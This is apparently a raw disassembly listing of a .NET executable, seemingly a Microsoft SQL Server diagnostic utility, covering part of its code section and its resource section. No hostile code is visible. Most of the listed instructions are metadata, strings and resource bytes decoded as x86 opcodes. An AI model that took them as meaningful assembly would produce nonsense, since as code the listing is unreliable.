  40aa67:	add    BYTE PTR [ebx+ebx*1],al
  40aa6a:	add    BYTE PTR [eax],al
  40aa6c:	add    BYTE PTR [esp+ebx*1],al
  40aa6f:	add    BYTE PTR [eax],al
  40aa71:	add    BYTE PTR [ebx*1+0x4000000],al
  40aa78:	push   ds
  40aa79:	add    BYTE PTR [eax],al
  40aa7b:	add    BYTE PTR [esi],al
  40aa7d:	and    BYTE PTR [edx],al
  40aa7f:	add    DWORD PTR [esi],ecx
  40aa81:	adc    DWORD PTR [ebx+eax*1+0x6],eax
  40aa85:	adc    DWORD PTR [edi+eax*1+0x6],ecx
  40aa89:	adc    eax,0x11012912
  40aa8e:	sub    eax,0x15002008
  40aa93:	adc    ch,BYTE PTR [ecx]
  40aa95:	add    DWORD PTR [ecx],edx
  40aa97:	sub    eax,0x12150607
  40aa9c:	sub    DWORD PTR [ecx],eax
  40aa9e:	adc    bl,BYTE PTR [eax]
  40aaa0:	or     BYTE PTR [eax],ah
  40aaa2:	add    BYTE PTR ds:0x12012912,dl
  40aaa8:	sbb    BYTE PTR [edi],al
  40aaaa:	push   es
  40aaab:	adc    eax,0x11012412
  40aab0:	xor    DWORD PTR [eax],ecx
  40aab2:	and    BYTE PTR [eax],al
  40aab4:	adc    eax,0x11012412
  40aab9:	xor    DWORD PTR [eax],ecx
  40aabb:	sub    BYTE PTR [eax],al
  40aabd:	adc    eax,0x11012912
  40aac2:	sub    eax,0x15002808
  40aac7:	adc    ch,BYTE PTR [ecx]
  40aac9:	add    DWORD PTR [edx],edx
  40aacb:	sbb    BYTE PTR [eax],cl
  40aacd:	sub    BYTE PTR [eax],al
  40aacf:	adc    eax,0x11012412
  40aad4:	xor    DWORD PTR [ebx],eax
  40aad6:	push   es
  40aad7:	adc    dh,BYTE PTR ds:0x39120603
  40aadd:	add    al,0x0
  40aadf:	add    BYTE PTR [edx],dl
  40aae1:	xor    eax,0x12000004
  40aae6:	cmp    DWORD PTR ds:0x12010100,eax
  40aaec:	cmp    DWORD PTR [eax+ecx*1],eax
  40aaef:	add    BYTE PTR [edx],dl
  40aaf1:	xor    eax,0x12000804
  40aaf6:	cmp    DWORD PTR [eax+eiz*1],eax
  40aaf9:	add    DWORD PTR [ecx],eax
  40aafb:	push   cs
  40aafc:	add    eax,0x11010120
  40ab01:	jno    0x40ab08
  40ab03:	and    BYTE PTR [ecx],al
  40ab05:	add    DWORD PTR [ecx],edx
  40ab07:	jns    0x40aa89
  40ab09:	mov    al,ds:0x2400
  40ab0e:	add    al,0x80
  40ab10:	add    BYTE PTR [eax],al
  40ab12:	xchg   esp,eax
  40ab13:	add    BYTE PTR [eax],al
  40ab15:	add    BYTE PTR [esi],al
  40ab17:	add    al,BYTE PTR [eax]
  40ab19:	add    BYTE PTR [eax],al
  40ab1b:	and    al,0x0
  40ab1d:	add    BYTE PTR [edx+0x53],dl
  40ab20:	inc    ecx
  40ab21:	xor    DWORD PTR [eax],eax
  40ab23:	add    al,0x0
  40ab25:	add    BYTE PTR [ecx],al
  40ab27:	add    BYTE PTR [ecx],al
  40ab29:	add    BYTE PTR [edi],ah
  40ab2b:	daa    
  40ab2c:	lods   eax,DWORD PTR ss:[esi]
  40ab2e:	outs   dx,BYTE PTR ds:[esi]
  40ab2f:	pop    edi
  40ab30:	xchg   ebp,eax
  40ab31:	xchg   BYTE PTR [edx-0x15ce2a3e],bh
  40ab37:	mov    esp,0x6c66cc3a
  40ab3c:	das    
  40ab3d:	mov    cs,eax
  40ab3f:	jns    0x40ab3b
  40ab41:	xchg   esp,eax
  40ab42:	clc    
  40ab43:	div    DWORD PTR [eax-0xdd082ce]
  40ab49:	in     eax,dx
  40ab4a:	push   edx
  40ab4b:	xor    al,0x48
  40ab4d:	clc    
  40ab4e:	cmp    al,0x3d
  40ab50:	pop    esp
  40ab51:	pop    ebp
  40ab52:	rcr    bh,cl
  40ab54:	(bad)  
  40ab55:	mov    esp,0x6b28c599
  40ab5a:	sub    al,0x12
  40ab5c:	push   ecx
  40ab5d:	pop    ss
  40ab5e:	mov    edi,0x2b24be5c
  40ab63:	popf   
  40ab64:	inc    ecx
  40ab65:	jne    0x40ab6e
  40ab67:	xor    dh,BYTE PTR [edx+0x49e6ffbd]
  40ab6d:	(bad)  
  40ab6e:	out    dx,eax
  40ab6f:	mov    eax,0x526d52e5
  40ab74:	outs   dx,DWORD PTR ds:[esi]
  40ab75:	fst    QWORD PTR [ebx]
  40ab77:	add    BYTE PTR [ebp-0xd842414],dl
  40ab7d:	adc    BYTE PTR [eax-0x27259364],al
  40ab83:	or     BYTE PTR [edi-0x56],0x9a
  40ab87:	shl    BYTE PTR [ecx],0xa
  40ab8a:	ret    
  40ab8b:	retf   
  40ab8c:	mov    ds:0x562305aa,al
  40ab91:	jnp    0x40abc0
  40ab93:	cli    
  40ab94:	jg     0x40ab78
  40ab96:	push   eax
  40ab97:	mov    bl,0xf
  40ab99:	lods   al,BYTE PTR ds:[esi]
  40ab9a:	mov    ebp,0x99ecd462
  40ab9f:	mov    ecx,0x7d7cc44a
  40aba4:	cmp    ebp,DWORD PTR [eax]
  40aba6:	icebp  
  40aba7:	mul    ah
  40aba9:	enter  0x1505,0x12
  40abad:	and    al,0x1
  40abaf:	add    al,BYTE PTR ds:0x80120000
  40abb5:	mov    DWORD PTR [esi],eax
  40abb7:	and    BYTE PTR [ecx],al
  40abb9:	add    DWORD PTR [edx],edx
  40abbb:	or     BYTE PTR [ecx+0x1022005],0xe
  40abc2:	push   cs
  40abc3:	add    eax,0x1c010220
  40abc8:	sbb    BYTE PTR [esi],al
  40abca:	and    BYTE PTR [ecx],al
  40abcc:	add    DWORD PTR [edx],edx
  40abce:	adc    BYTE PTR [ecx+0x1032006],0xe
  40abd5:	sbb    al,0x1c
  40abd7:	add    eax,0xe010220
  40abdc:	sbb    al,0x6
  40abde:	adc    eax,0x11012412
  40abe3:	dec    esp
  40abe4:	add    eax,0x1241215
  40abe9:	push   cs
  40abea:	or     BYTE PTR [eax],al
  40abec:	add    DWORD PTR [edx],edx
  40abee:	sbb    BYTE PTR [ecx+0x89d8011],0x0
  40abf5:	add    ebx,DWORD PTR [edx+edx*1]
  40abf8:	sbb    BYTE PTR [ecx+0x1507020e],0x12
  40abff:	and    BYTE PTR [ecx+0xa211201],0x20
  40ac06:	add    DWORD PTR [ecx],eax
  40ac08:	adc    eax,0x1a58012
  40ac0d:	adc    ah,BYTE PTR [ecx]
  40ac0f:	pop    es
  40ac10:	and    BYTE PTR [ecx+eax*1],al
  40ac13:	push   cs
  40ac14:	sbb    al,0x1c
  40ac16:	sbb    al,0x5
  40ac18:	and    BYTE PTR [eax],al
  40ac1a:	adc    al,BYTE PTR [eax+0x12004b1]
  40ac20:	add    bl,BYTE PTR [esp+eax*1]
  40ac23:	and    BYTE PTR [ecx],al
  40ac25:	sbb    al,0x1c
  40ac27:	add    eax,0x80120020
  40ac2c:	mov    ebp,0x12002005
  40ac31:	add    cl,0x3
  40ac34:	and    BYTE PTR [eax],al
  40ac36:	sbb    al,0x4
  40ac38:	add    BYTE PTR [ecx],al
  40ac3a:	add    DWORD PTR [eax],ecx
  40ac3c:	pop    ss
  40ac3d:	pop    es
  40ac3e:	or     DWORD PTR [edx],edx
  40ac40:	sub    BYTE PTR [edx],dl
  40ac42:	sbb    DWORD PTR [edx],edx
  40ac44:	cmp    BYTE PTR [ecx-0x3a7fedf2],0x12
  40ac4b:	sub    BYTE PTR [ebp-0x3e7fedf8],0x12
  40ac52:	or     cl,0x5
  40ac55:	and    BYTE PTR [ecx],al
  40ac57:	add    DWORD PTR [edx],edx
  40ac59:	sbb    DWORD PTR [ebx],ecx
  40ac5b:	and    BYTE PTR [ecx],al
  40ac5d:	add    DWORD PTR ds:0x1d58012,edx
  40ac63:	adc    DWORD PTR [eax+0x121506d9],eax
  40ac69:	sub    DWORD PTR [ecx],eax
  40ac6b:	adc    bl,BYTE PTR [eax]
  40ac6d:	add    esp,DWORD PTR [eax]
  40ac6f:	add    BYTE PTR [eax],cl
  40ac71:	or     DWORD PTR [eax],esp
  40ac73:	add    BYTE PTR ds:0x1dd8011,dl
  40ac79:	adc    eax,DWORD PTR [eax]
  40ac7b:	pop    es
  40ac7c:	adc    eax,0x1dd8011
  40ac81:	adc    bl,BYTE PTR [eax]
  40ac83:	add    eax,DWORD PTR [esi]
  40ac85:	adc    DWORD PTR [ecx],esi
  40ac87:	push   es
  40ac88:	adc    eax,0x11012412
  40ac8d:	xor    DWORD PTR ds:0x80120020,eax
  40ac93:	loope  0x40ac9f
  40ac95:	and    BYTE PTR [ebx],al
  40ac97:	add    DWORD PTR [edx],edx
  40ac99:	and    ch,0x2
  40ac9c:	adc    DWORD PTR [eax+0x70713e9],eax
  40aca2:	adc    al,BYTE PTR [eax+0xe1812d1]
  40aca8:	push   cs
  40aca9:	push   cs
  40acaa:	adc    DWORD PTR [ecx],esi
  40acac:	adc    eax,0x1dd8011
  40acb1:	adc    bl,BYTE PTR [eax]
  40acb3:	push   es
  40acb4:	and    BYTE PTR [ecx],al
  40acb6:	add    DWORD PTR [ecx],edx
  40acb8:	sub    ch,0x6
  40acbb:	and    BYTE PTR [ecx],al
  40acbd:	add    DWORD PTR [edx],edx
  40acbf:	xor    ch,0x10
  40acc2:	pop    es
  40acc3:	or     dl,BYTE PTR [ecx]
  40acc5:	sub    ch,0xe
  40acc8:	push   cs
  40acc9:	push   cs
  40acca:	push   cs
  40accb:	adc    al,BYTE PTR [eax+0xe0e0ef5]
  40acd1:	push   cs
  40acd2:	add    eax,0x1c010220
  40acd7:	sbb    al,0x5
  40acd9:	add    BYTE PTR [edx],al
  40acdb:	add    cl,BYTE PTR [esi]
  40acdd:	push   cs
  40acde:	push   es
  40acdf:	and    BYTE PTR [ecx],al
  40ace1:	add    DWORD PTR [edx],edx
  40ace3:	or     DWORD PTR ds:0x1012006,0x5098112
  40aced:	and    BYTE PTR [eax],al
  40acef:	adc    al,BYTE PTR [ecx+0x1200415]
  40acf5:	add    cl,BYTE PTR [esi]
  40acf7:	or     DWORD PTR [eax],eax
  40acf9:	add    ecx,DWORD PTR [esi]
  40acfb:	adc    al,BYTE PTR [ecx+0x1c1d0e1d]
  40ad01:	or     DWORD PTR [eax],esp
  40ad03:	add    al,BYTE PTR [ecx]
  40ad05:	adc    al,BYTE PTR [ecx+0x11811229]
  40ad0b:	adc    DWORD PTR [edi],eax
  40ad0d:	push   es
  40ad0e:	adc    al,BYTE PTR [eax-0x7eedf107]
  40ad14:	add    DWORD PTR [edx],edx
  40ad16:	cmp    BYTE PTR [ecx+0x1d118112],0x1c
  40ad1d:	add    al,0x20
  40ad1f:	add    BYTE PTR [ecx],dl
  40ad21:	adc    eax,0x11010704
  40ad26:	adc    eax,0x12002005
  40ad2b:	sub    DWORD PTR ds:0x11002005,0x20063181
  40ad35:	add    al,BYTE PTR [ecx]
  40ad37:	push   cs
  40ad38:	sbb    eax,0x207051c
  40ad3d:	add    bl,BYTE PTR ds:0x200071c
  40ad43:	push   cs
  40ad44:	or     BYTE PTR [edx],dl
  40ad46:	sbb    DWORD PTR ds:0xe020007,0x1d81121c
  40ad50:	add    eax,DWORD PTR [edi]
  40ad52:	add    DWORD PTR [edx],eax
  40ad54:	add    eax,0x81120000
  40ad59:	cmp    eax,0x1d022008
  40ad5e:	sbb    al,0x12
  40ad60:	sbb    BYTE PTR [ecx+0x1000402],0xe
  40ad67:	push   cs
  40ad68:	push   es
  40ad69:	pop    es
  40ad6a:	add    bl,BYTE PTR ds:0x665121c
  40ad70:	pop    es
  40ad71:	add    bl,BYTE PTR ds:0x659121c
  40ad77:	pop    es
  40ad78:	add    bl,BYTE PTR ds:0x349121c
  40ad7e:	add    BYTE PTR [eax],al
  40ad80:	add    DWORD PTR ds:0x1241215,eax
  40ad86:	or     BYTE PTR [esi],al
  40ad88:	adc    eax,0x8022512
  40ad8d:	add    al,BYTE PTR ds:0x13020120
  40ad93:	add    BYTE PTR [edi],al
  40ad95:	and    BYTE PTR [edx],al
  40ad97:	add    DWORD PTR [ebx],edx
  40ad99:	add    BYTE PTR [ebx],dl
  40ad9b:	add    DWORD PTR [esi],eax
  40ad9d:	adc    eax,0x13012412
  40ada2:	add    BYTE PTR [edx],al
  40ada4:	adc    eax,DWORD PTR [eax]
  40ada6:	pop    es
  40ada7:	add    BYTE PTR [edx],al
  40ada9:	or     BYTE PTR [esi],cl
  40adab:	adc    al,BYTE PTR [ecx+0x107051d]
  40adb1:	adc    al,BYTE PTR [eax+0x5f9]
  40adb7:	adc    al,BYTE PTR [ecx+0x4070649]
  40adbd:	push   cs
  40adbe:	sbb    BYTE PTR [ecx],cl
  40adc0:	or     DWORD PTR [edi],eax
  40adc2:	and    BYTE PTR [edx],al
  40adc4:	add    cl,BYTE PTR [esi]
  40adc6:	adc    DWORD PTR [ecx+0x120044d],eax
  40adcc:	push   cs
  40adcd:	or     BYTE PTR [edi+eax*1],cl
  40add0:	add    eax,0x1148111d
  40add5:	dec    eax
  40add6:	add    bl,BYTE PTR ds:0x14084811
  40addc:	pop    es
  40addd:	or     dl,BYTE PTR [ecx]
  40addf:	sub    al,0x11
  40ade1:	cmp    BYTE PTR [ecx],dl
  40ade3:	xor    BYTE PTR [ecx],dl
  40ade5:	xor    al,0x11
  40ade7:	cmp    al,0x12
  40ade9:	sbb    BYTE PTR [eax],cl
  40adeb:	push   cs
  40adec:	adc    DWORD PTR [ecx+edx*1+0x2c],eax
  40adf0:	add    eax,0x31110100
  40adf5:	or     eax,0x29121506
  40adfa:	add    DWORD PTR [ecx],edx
  40adfc:	sub    eax,0x11010704
  40ae01:	cmp    al,0x5
  40ae03:	and    BYTE PTR [edx],al
  40ae05:	push   cs
  40ae06:	or     BYTE PTR [eax],cl
  40ae08:	add    al,0x7
  40ae0a:	add    DWORD PTR [ecx],edx
  40ae0c:	cmp    BYTE PTR [edi+eax*1],al
  40ae0f:	add    DWORD PTR [ecx],edx
  40ae11:	inc    esp
  40ae12:	pop    es
  40ae13:	pop    es
  40ae14:	add    eax,DWORD PTR [edx]
  40ae16:	adc    DWORD PTR [ecx+edx*1],esi
  40ae19:	inc    esp
  40ae1a:	or     eax,DWORD PTR [edi]
  40ae1c:	add    ebx,DWORD PTR ds:0x111d4811
  40ae22:	dec    eax
  40ae23:	sbb    eax,0x20064811
  40ae28:	add    DWORD PTR [ecx],eax
  40ae2a:	adc    DWORD PTR [ecx+0x14055],eax
  40ae30:	xor    edx,DWORD PTR [ebx+0x79]
  40ae33:	jae    0x40aea9
  40ae35:	gs ins DWORD PTR es:[edi],dx
  40ae37:	cs push edx
  40ae39:	gs jae 0x40aeab
  40ae3c:	jne    0x40aeb0
  40ae3e:	arpl   WORD PTR [ebp+0x73],sp
  40ae41:	cs push esp
  40ae43:	outs   dx,DWORD PTR ds:[esi]
  40ae44:	outs   dx,DWORD PTR ds:[esi]
  40ae45:	ins    BYTE PTR es:[edi],dx
  40ae46:	jae    0x40ae76
  40ae48:	push   ebx
  40ae49:	je     0x40aebd
  40ae4b:	outs   dx,DWORD PTR ds:[esi]
  40ae4c:	outs   dx,BYTE PTR ds:[esi]
  40ae4d:	ins    BYTE PTR es:[di],dx
  40ae4f:	jns    0x40aea5
  40ae51:	jns    0x40aec3
  40ae53:	gs fs push edx
  40ae56:	gs jae 0x40aec8
  40ae59:	jne    0x40aecd
  40ae5b:	arpl   WORD PTR [ebp+0x42],sp
  40ae5e:	jne    0x40aec9
  40ae60:	ins    BYTE PTR es:[edi],dx
  40ae61:	fs gs jb 0x40ae6c
  40ae65:	xor    ch,BYTE PTR [esi]
  40ae67:	xor    BYTE PTR [esi],ch
  40ae69:	xor    BYTE PTR [esi],ch
  40ae6b:	xor    BYTE PTR [eax],al
  40ae6d:	add    BYTE PTR ds:0x1c020200,al
  40ae73:	sbb    al,0x5
  40ae75:	and    BYTE PTR [eax],al
  40ae77:	adc    al,BYTE PTR [ecx+0x220073d]
  40ae7d:	add    DWORD PTR [esi],ecx
  40ae7f:	adc    al,BYTE PTR [ecx+0x107043d]
  40ae85:	adc    dh,BYTE PTR ds:0xe022006
  40ae8b:	push   cs
  40ae8c:	adc    bh,BYTE PTR [ecx]
  40ae8e:	push   es
  40ae8f:	and    BYTE PTR [ecx],al
  40ae91:	add    DWORD PTR [ecx],edx
  40ae93:	sub    DWORD PTR [ecx+0x8],0x20001
  40ae9a:	add    BYTE PTR [eax],al
  40ae9c:	add    BYTE PTR [eax],al
  40ae9e:	add    eax,0x10001
  40aea3:	add    BYTE PTR [ecx],bl
  40aea5:	add    DWORD PTR [eax],eax
  40aea7:	adc    al,0x4d
  40aea9:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40aeb0:	je     0x40aed2
  40aeb2:	push   ebx
  40aeb3:	push   ecx
  40aeb4:	dec    esp
  40aeb5:	and    BYTE PTR [ebx+0x65],dl
  40aeb8:	jb     0x40af30
  40aeba:	gs jb  0x40aebd
  40aebd:	add    BYTE PTR [ecx],ch
  40aebf:	add    DWORD PTR [eax],eax
  40aec1:	and    al,0x4d
  40aec3:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40aeca:	je     0x40aeec
  40aecc:	inc    ebx
  40aecd:	outs   dx,DWORD PTR ds:[esi]
  40aece:	jb     0x40af40
  40aed0:	and    BYTE PTR cs:[ecx+0x6c],al
  40aed4:	ins    BYTE PTR es:[edi],dx
  40aed5:	and    BYTE PTR [edx+0x69],dh
  40aed8:	addr16 push 0x72207374
  40aede:	gs jae 0x40af46
  40aee1:	jb     0x40af59
  40aee3:	gs fs add BYTE PTR cs:[eax],al
  40aee8:	sbb    al,BYTE PTR [ecx]
  40aeea:	add    BYTE PTR ds:0x7263694d,dl
  40aef0:	outs   dx,DWORD PTR ds:[esi]
  40aef1:	jae    0x40af62
  40aef3:	data16 je 0x40af16
  40aef6:	inc    ebx
  40aef7:	outs   dx,DWORD PTR ds:[esi]
  40aef8:	jb     0x40af6a
  40aefa:	outs   dx,DWORD PTR ds:[esi]
  40aefb:	jb     0x40af5e
  40aefd:	je     0x40af68
  40aeff:	outs   dx,DWORD PTR ds:[esi]
  40af00:	outs   dx,BYTE PTR ds:[esi]
  40af01:	add    BYTE PTR [eax],al
  40af03:	sub    al,0x1
  40af05:	add    BYTE PTR [edi],ah
  40af07:	xor    DWORD PTR [ecx],esi
  40af09:	xor    BYTE PTR cs:[esi],ch
  40af0c:	xor    dh,BYTE PTR [ecx]
  40af0e:	xor    BYTE PTR [eax],dh
  40af10:	cs xor BYTE PTR ss:[eax],ah
  40af14:	sub    BYTE PTR [eax],ch
  40af16:	push   ebx
  40af17:	push   ecx
  40af18:	dec    esp
  40af19:	xor    DWORD PTR [ecx],esi
  40af1b:	pop    edi
  40af1c:	push   edx
  40af1d:	push   esp
  40af1e:	dec    ebp
  40af1f:	sub    DWORD PTR [esi],ebp
  40af21:	xor    DWORD PTR [edx],esi
  40af23:	xor    BYTE PTR [edx],dh
  40af25:	xor    DWORD PTR [eax],esi
  40af27:	sub    eax,0x37313931
  40af2c:	and    BYTE PTR [ecx],ch
  40af2e:	add    BYTE PTR [eax],al
  40af30:	adc    DWORD PTR [ecx],eax
  40af32:	add    BYTE PTR [ecx+esi*1],cl
  40af35:	xor    DWORD PTR [esi],ebp
  40af37:	xor    BYTE PTR [esi],ch
  40af39:	xor    dh,BYTE PTR [ecx]
  40af3b:	xor    BYTE PTR [eax],dh
  40af3d:	cs xor BYTE PTR ss:[eax],al
  40af41:	add    BYTE PTR ds:0x65300001,dh
  40af47:	cmp    bl,BYTE PTR [ebx+esi*2+0x71]
  40af4b:	ins    BYTE PTR es:[edi],dx
  40af4c:	xor    DWORD PTR [ecx],esi
  40af4e:	pop    edi
  40af4f:	ins    DWORD PTR es:[edi],dx
  40af50:	popa   
  40af51:	imul   ebp,DWORD PTR [esi+0x5f],0x735c5c74
  40af58:	jno    0x40afc6
  40af5a:	pop    esp
  40af5b:	inc    ebx
  40af5c:	outs   dx,DWORD PTR ds:[esi]
  40af5d:	ins    DWORD PTR es:[edi],dx
  40af5e:	ins    DWORD PTR es:[edi],dx
  40af5f:	outs   dx,DWORD PTR ds:[esi]
  40af60:	outs   dx,BYTE PTR ds:[esi]
  40af61:	pop    esp
  40af62:	push   ebx
  40af63:	dec    esi
  40af64:	dec    ebx
  40af65:	pop    esp
  40af66:	push   ebx
  40af67:	push   ecx
  40af68:	dec    esp
  40af69:	xor    dh,BYTE PTR [eax]
  40af6b:	xor    BYTE PTR [ebx],dh
  40af6d:	push   ebx
  40af6e:	dec    esi
  40af6f:	dec    ebx
  40af70:	inc    ebp
  40af71:	pop    ecx
  40af72:	cs jae 0x40afe3
  40af75:	imul   eax,DWORD PTR [eax],0x0
  40af78:	add    DWORD PTR es:[eax],eax
  40af7b:	and    DWORD PTR [ebx+0x65],edx
  40af7e:	jb     0x40aff6
  40af80:	imul   esp,DWORD PTR [ebx+0x65],0x6f724220
  40af87:	imul   esp,DWORD PTR [ebp+0x72],0x20
  40af8b:	inc    esp
  40af8c:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  40af93:	imul   esp,DWORD PTR [ebx+0x20],0x6c697455
  40af9a:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x14d00
  40afa2:	dec    eax
  40afa3:	dec    ebp
  40afa4:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40afab:	je     0x40afcd
  40afad:	push   ebx
  40afae:	push   ecx
  40afaf:	dec    esp
  40afb0:	and    BYTE PTR [ebx+0x65],dl
  40afb3:	jb     0x40b02b
  40afb5:	gs jb  0x40afd8
  40afb8:	imul   esi,DWORD PTR [ebx+0x20],0x65722061
  40afbf:	imul   esi,DWORD PTR [bp+di+0x74],0x64657265
  40afc7:	and    BYTE PTR [edx+esi*2+0x61],dh
  40afcb:	fs gs ins DWORD PTR es:[edi],dx
  40afce:	popa   
  40afcf:	jb     0x40b03c
  40afd1:	and    BYTE PTR [edi+0x66],ch
  40afd4:	and    BYTE PTR [ebp+0x69],cl
  40afd7:	arpl   WORD PTR [edx+0x6f],si
  40afda:	jae    0x40b04b
  40afdc:	data16 je 0x40afff
  40afdf:	inc    ebx
  40afe0:	outs   dx,DWORD PTR ds:[esi]
  40afe1:	jb     0x40b053
  40afe3:	outs   dx,DWORD PTR ds:[esi]
  40afe4:	jb     0x40b047
  40afe6:	je     0x40b051
  40afe8:	outs   dx,DWORD PTR ds:[esi]
  40afe9:	outs   dx,BYTE PTR ds:[esi]
  40afea:	add    BYTE PTR cs:[eax],al
  40afed:	or     BYTE PTR [ecx],al
  40afef:	add    BYTE PTR [eax],cl
  40aff1:	add    BYTE PTR [eax],al
  40aff3:	add    BYTE PTR [eax],al
  40aff5:	add    BYTE PTR [esi],bl
  40aff7:	add    DWORD PTR [eax],eax
  40aff9:	add    DWORD PTR [eax],eax
  40affb:	push   esp
  40affc:	add    dl,BYTE PTR [esi]
  40affe:	push   edi
  40afff:	jb     0x40b062
  40b001:	jo     0x40b051
  40b003:	outs   dx,DWORD PTR ds:[esi]
  40b004:	outs   dx,BYTE PTR ds:[esi]
  40b005:	inc    ebp
  40b006:	js     0x40b06b
  40b008:	gs jo  0x40b07f
  40b00b:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40b012:	ja     0x40b087
  40b014:	add    DWORD PTR [eax-0x7ffed162],eax
  40b01a:	test   BYTE PTR [ebx+0x79],dl
  40b01d:	jae    0x40b093
  40b01f:	gs ins DWORD PTR es:[edi],dx
  40b021:	cs push ebx
  40b023:	arpl   WORD PTR gs:[ebp+0x72],si
  40b027:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  40b02f:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  40b036:	cs push ebx
  40b038:	arpl   WORD PTR gs:[ebp+0x72],si
  40b03c:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  40b044:	jae    0x40b0b9
  40b046:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40b04d:	imul   esp,DWORD PTR [edx+0x75],0x202c6574
  40b054:	ins    DWORD PTR es:[edi],dx
  40b055:	jae    0x40b0ba
  40b057:	outs   dx,DWORD PTR ds:[esi]
  40b058:	jb     0x40b0c6
  40b05a:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  40b061:	jae    0x40b0cc
  40b063:	outs   dx,DWORD PTR ds:[esi]
  40b064:	outs   dx,BYTE PTR ds:[esi]
  40b065:	cmp    eax,0x2e302e34
  40b06a:	xor    BYTE PTR [esi],ch
  40b06c:	xor    BYTE PTR [eax+eiz*1],ch
  40b06f:	inc    ebx
  40b070:	jne    0x40b0de
  40b072:	je     0x40b0e9
  40b074:	jb     0x40b0db
  40b076:	cmp    eax,0x7475656e
  40b07b:	jb     0x40b0de
  40b07d:	ins    BYTE PTR es:[edi],dx
  40b07e:	sub    al,0x20
  40b080:	push   eax
  40b081:	jne    0x40b0e5
  40b083:	ins    BYTE PTR es:[edi],dx
  40b084:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  40b08b:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40b08f:	bound  esi,QWORD PTR [edi]
  40b091:	aaa    
  40b092:	popa   
  40b093:	xor    eax,0x31363563
  40b098:	cmp    DWORD PTR [ebx],esi
  40b09a:	xor    al,0x65
  40b09c:	xor    BYTE PTR [eax],bh
  40b09e:	cmp    DWORD PTR ds:0x10025401,edx
  40b0a4:	push   ebx
  40b0a5:	imul   ebp,DWORD PTR [ecx+0x70],0x56
  40b0a9:	gs jb  0x40b115
  40b0ac:	imul   sp,WORD PTR [ebx+0x61],0x6974
  40b0b2:	outs   dx,DWORD PTR ds:[esi]
  40b0b3:	outs   dx,BYTE PTR ds:[esi]
  40b0b4:	add    DWORD PTR [eax],eax
  40b0b6:	add    BYTE PTR [eax],al
  40b0b8:	add    BYTE PTR [eax],al
  40b0ba:	add    BYTE PTR [eax],al
  40b0bc:	(bad)  
  40b0bd:	loop   0x40b0f4
  40b0bf:	dec    edi
  40b0c0:	add    BYTE PTR [eax],al
  40b0c2:	add    BYTE PTR [eax],al
  40b0c4:	add    al,BYTE PTR [eax]
  40b0c6:	add    BYTE PTR [eax],al
  40b0c8:	sub    BYTE PTR [eax],al
  40b0ca:	add    BYTE PTR [eax],al
  40b0cc:	aam    0xb0
  40b0ce:	add    BYTE PTR [eax],al
  40b0d0:	aam    0x92
  40b0d2:	add    BYTE PTR [eax],al
  40b0d4:	push   edx
  40b0d5:	push   ebx
  40b0d6:	inc    esp
  40b0d7:	push   ebx
  40b0d8:	mov    bh,0xca
  40b0da:	or     al,0x2b
  40b0dc:	ja     0x40b14e
  40b0de:	push   ebx
  40b0df:	dec    esp
  40b0e0:	xchg   edi,eax
  40b0e1:	push   ecx
  40b0e2:	mov    ebx,0xaa0d1a5f
  40b0e7:	mov    eax,DWORD PTR [ecx]
  40b0e9:	add    BYTE PTR [eax],al
  40b0eb:	add    BYTE PTR [ebx+0x73],dh
  40b0ee:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  40b0f2:	outs   dx,BYTE PTR ds:[si]
  40b0f4:	outs   dx,DWORD PTR ds:[esi]
  40b0f5:	jae    0x40b15c
  40b0f7:	cs jo  0x40b15e
  40b0fa:	bound  eax,QWORD PTR [eax]
	...
  40b148:	jo     0x40b0fb
	...
  40b152:	add    BYTE PTR [eax],al
  40b154:	mov    ?,WORD PTR [ecx+0x20000000]
	...
  40b16e:	add    BYTE PTR [eax],al
  40b170:	xor    BYTE PTR [ecx+0x0],0x0
	...
  40b17f:	add    BYTE PTR [eax],al
  40b181:	add    BYTE PTR [edi+0x43],bl
  40b184:	outs   dx,DWORD PTR ds:[esi]
  40b185:	jb     0x40b1cc
  40b187:	js     0x40b1ee
  40b189:	dec    ebp
  40b18a:	popa   
  40b18b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  40b192:	jb     0x40b1f9
  40b194:	gs cs fs ins BYTE PTR es:[edi],dx
  40b198:	ins    BYTE PTR es:[edi],dx
  40b199:	add    BYTE PTR [eax],al
  40b19b:	add    BYTE PTR [eax],al
  40b19d:	add    bh,bh
  40b19f:	and    eax,0x402000

Disassembly of section .rsrc:

0040c000 <.rsrc>:
	...
  40c00c:	add    BYTE PTR [eax],al
  40c00e:	add    al,BYTE PTR [eax]
  40c010:	adc    BYTE PTR [eax],al
  40c012:	add    BYTE PTR [eax],al
  40c014:	and    BYTE PTR [eax],al
  40c016:	add    BYTE PTR [eax+0x18],al
  40c01c:	cmp    BYTE PTR [eax],al
  40c01e:	add    BYTE PTR [eax+0x0],al
	...
  40c02c:	add    BYTE PTR [eax],al
  40c02e:	add    DWORD PTR [eax],eax
  40c030:	add    DWORD PTR [eax],eax
  40c032:	add    BYTE PTR [eax],al
  40c034:	push   eax
  40c035:	add    BYTE PTR [eax],al
  40c037:	add    BYTE PTR [eax],0x0
	...
  40c046:	add    DWORD PTR [eax],eax
  40c048:	add    DWORD PTR [eax],eax
  40c04a:	add    BYTE PTR [eax],al
  40c04c:	push   0x800000
	...
  40c05d:	add    BYTE PTR [ecx],al
  40c05f:	add    BYTE PTR [ecx],cl
  40c061:	add    al,0x0
  40c063:	add    BYTE PTR [eax+0x0],al
	...
  40c075:	add    BYTE PTR [ecx],al
  40c077:	add    BYTE PTR [ecx],cl
  40c079:	add    al,0x0
  40c07b:	add    BYTE PTR [eax+0x68000000],dl
  40c081:	ret    
  40c082:	add    BYTE PTR [eax],al
  40c084:	lods   al,BYTE PTR ds:[esi]
  40c085:	add    al,0x0
	...
  40c08f:	add    BYTE PTR [eax-0x39ffff40],ah
  40c095:	add    al,BYTE PTR [eax]
	...
